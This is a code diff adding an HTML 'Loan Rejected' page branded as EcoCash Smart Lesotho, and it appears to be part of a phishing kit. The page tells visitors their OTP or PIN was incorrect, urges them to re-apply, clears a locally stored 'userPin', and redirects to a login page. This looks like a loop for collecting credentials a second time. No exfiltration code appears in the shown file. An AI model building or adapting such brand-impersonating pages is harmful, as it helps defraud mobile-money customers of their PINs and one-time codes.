@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Status | EcoCash Smart</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+        
+        body { 
+            background-color: #f8fafc; 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+        }
+
+        .status-card {
+            background: #ffffff;
+            border-radius: 50px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.03);
+            border: 1px solid #fee2e2; /* Subtle red border for rejection */
+        }
+
+        .btn-retry {
+            background-color: #000099;
+            color: white;
+            padding: 1.25rem;
+            border-radius: 100px;
+            font-weight: 700;
+            width: 100%;
+            transition: all 0.2s ease;
+        }
+
+        .btn-retry:active {
+            transform: scale(0.98);
+        }
+
+        .fade-in {
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-6">
+
+    <div class="mb-8 text-center">
+        <h1 class="text-4xl font-bold">
+            <span class="text-blue-600">Eco</span><span class="text-red-600">Cash</span>
+        </h1>
+        <p class="text-gray-400 mt-2 uppercase text-[10px] font-bold tracking-[0.3em]">Lesotho</p>
+    </div>
+
+    <div class="max-w-[420px] w-full status-card p-10 md:p-12 text-center fade-in">
+        
+        <div class="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
+            <i class="fas fa-times-circle text-4xl"></i>
+        </div>
+
+        <h2 class="text-2xl font-extrabold text-gray-800">Loan Rejected</h2>
+        
+        <div class="mt-4 p-4 bg-red-50 rounded-2xl border border-red-100">
+            <p class="text-sm text-red-600 font-semibold leading-relaxed">
+                Re tšoaba, kopo ea hau e hanoitsoe (Rejected)
+            </p>
+            <p class="text-[11px] text-red-500 mt-2">
+                Reason: Incorrect OTP or PIN provided. For security, we cannot proceed with this request.
+            </p>
+        </div>
+
+        <p class="text-sm text-gray-500 mt-8 mb-8">
+            Please verify your credentials and try applying again.
+        </p>
+
+        <button onclick="reApply()" class="btn-retry shadow-lg shadow-blue-100">
+            <i class="fas fa-redo-alt mr-2 text-sm"></i> Re-Apply Again
+        </button>
+
+        <div class="mt-8 pt-6 border-t border-gray-50 flex items-center justify-center gap-2 text-[10px] text-gray-400 font-bold uppercase tracking-widest">
+            <i class="fas fa-shield-alt text-gray-300"></i> Secure Connection
+        </div>
+    </div>
+
+    <script>
+        function reApply() {
+            // Clear specific sensitive data if needed before redirecting
+            localStorage.removeItem('userPin');
+            window.location.href = 'login.html';
+        }
+    </script>
+
+</body>
+</html>
